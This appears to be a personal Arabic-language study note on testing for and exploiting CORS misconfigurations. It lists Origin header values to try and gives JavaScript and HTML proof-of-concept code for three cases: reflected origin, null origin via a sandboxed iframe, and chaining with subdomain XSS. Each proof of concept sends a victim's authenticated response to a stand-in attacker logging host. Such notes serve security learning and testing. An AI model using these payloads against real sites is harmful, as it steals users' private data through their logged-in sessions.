____
# الخلاصة
انت بتحط ال origin header وبتجرب في قيم زي:
- null
- *
- https://evil.com
- https://website.com
- https://xssvuln.website.com

وبتشوف ال response هل فيه ال 2 headers دول ولا لأ:

```http
----
Access-Control-Allow-Origin: https://evil.com 
OR 
Access-Control-Allow-Origin: *
OR
Access-Control-Allow-Origin: null
OR
Access-Control-Allow-Origin: https://xssvuln.website.com


Access-Control-Allow-Credentials: true
----
```
___




### ما هي ال CORS؟

قبل م نعرف لازم نفهم يعني اي Same Origin Policy
![[Pasted image 20240721160252.png]]
![[Pasted image 20240721160506.png]]

REQUEST
```http
-----
Origin: https://evil.com
-----
```

RESPONSE
```http
-----
Access-Control-Allow-Origin: https://evil.com OR Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
-----
```

<mark style="background: #FFB86CA6;">This is a vulnerability!</mark>

![[Pasted image 20240721161300.png]]

----
### Some Techniques

1. اشهر Misconf هو اللي بي reflect ال origin
REQUEST
```http
-----
Origin: https://evil.com
-----
```

RESPONSE
```http
-----
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
-----
```

ودا الاستغلال بتاعها:
```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```
==================================================================

2. تاني اشهر واحد هو null
REQUEST
```http
----
Origin: null
----
```

RESPONSE
```http
----
Access-Control-Allow-Origin: null
----
```

ودا استغلالها بيعتمد علي iframe sand-boxed

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```
==================================================================

3. CORS Chained with XSS!

لو لقيت CORS بس بيقبل فقط ال subdomains مثلا لكن لقيت في subdomain انه فيه ثغرة XSS.
هنا في احتمالية كبيرة انه الثغرة تشتغل معاك بال POC دا:
```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://www.vulnerable.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

هتحطه في مكان ال XSS وبس!
ووقت الأستغلال هتعمل الاتي:
```html
<script>
document.location = "https://xssvuln.website.com?vuln=YOUR_EXPLOIT_URL_ENCODED"
</script>
```
